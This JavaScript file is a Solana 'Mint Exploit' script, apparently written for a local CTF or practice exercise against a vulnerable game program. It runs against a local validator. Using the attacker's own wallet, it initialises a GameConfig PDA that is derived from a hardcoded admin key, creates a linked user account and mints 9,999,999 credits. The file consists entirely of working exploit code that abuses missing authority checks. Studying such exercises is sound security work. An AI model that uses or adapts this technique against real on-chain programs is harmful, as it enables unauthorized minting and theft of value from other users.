const web3 = require('@solana/web3.js');
const fs = require('fs');

// Connect
const connection = new web3.Connection("http://localhost:8899", "confirmed");

// Load wallet
const payer = web3.Keypair.fromSecretKey(
    Uint8Array.from(
        JSON.parse(fs.readFileSync('/Users/shreyagupta/.config/solana/id.json'))
    )
);

// Program ID
const programId = new web3.PublicKey('9YiXuCK1NrjP8gthvEt19zBm77X1edDuECvwTUVtMmLx');

// Admin publickey (fixed hardcoded)
const adminPubkey = new web3.PublicKey('J4LcUYuPNR1s2DB5TU3ogXQR8uqx7SEYQGNA6VcNAdqE');

async function main() {
    console.log("🚀 Starting Mint Exploit...");

    // Step 1: Derive PDA for GameConfig
    const [gameConfigPubkey, bump] = web3.PublicKey.findProgramAddressSync(
        [
            adminPubkey.toBuffer(),
            Buffer.from("GAME_CONFIG")
        ],
        programId
    );

    console.log("✅ Derived GameConfig PDA:", gameConfigPubkey.toBase58());

    // Step 2: Create GameConfig properly
    const createInstructionData = Buffer.from(
        Uint8Array.of(
            0, // CreateGameConfig variant
            5  // credits_per_level
        )
    );

    const createGameConfigIx = new web3.TransactionInstruction({
        keys: [
            { pubkey: gameConfigPubkey, isSigner: false, isWritable: true },
            { pubkey: payer.publicKey, isSigner: true, isWritable: false },
            { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        programId,
        data: createInstructionData,
    });

    const tx1 = new web3.Transaction().add(createGameConfigIx);
    await web3.sendAndConfirmTransaction(connection, tx1, [payer]);
    console.log("✅ GameConfig PDA initialized!");

    // Step 3: Create NEW User account linked to correct GameConfig
    const [userPubkey, userBump] = web3.PublicKey.findProgramAddressSync(
        [
            gameConfigPubkey.toBuffer(),
            payer.publicKey.toBuffer(),
            Buffer.from("USER")
        ],
        programId
    );

    console.log("✅ Derived User PDA:", userPubkey.toBase58());

    const createUserIx = new web3.TransactionInstruction({
        keys: [
            { pubkey: gameConfigPubkey, isSigner: false, isWritable: false },
            { pubkey: userPubkey, isSigner: false, isWritable: true },
            { pubkey: payer.publicKey, isSigner: true, isWritable: false },
            { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        programId,
        data: Buffer.from(Uint8Array.of(1)), // Variant 1 = CreateUser
    });

    const tx2 = new web3.Transaction().add(createUserIx);
    await web3.sendAndConfirmTransaction(connection, tx2, [payer]);
    console.log("✅ User account created linked to GameConfig!");

    // Step 4: Mint credits
    const mintInstructionData = Buffer.from(
        Uint8Array.of(
            2, // MintCreditsToUser variant
            ...new Uint8Array(new Uint32Array([9999999]).buffer)
        )
    );

    const mintTx = new web3.Transaction().add({
        keys: [
            { pubkey: gameConfigPubkey, isSigner: false, isWritable: false },
            { pubkey: userPubkey, isSigner: false, isWritable: true },
            { pubkey: payer.publicKey, isSigner: true, isWritable: false },
        ],
        programId,
        data: mintInstructionData,
    });

    const txSig = await web3.sendAndConfirmTransaction(connection, mintTx, [payer]);

    console.log(`✅ Mint exploit transaction sent! Signature: ${txSig}`);
}

main().catch((err) => {
    console.error(err);
});
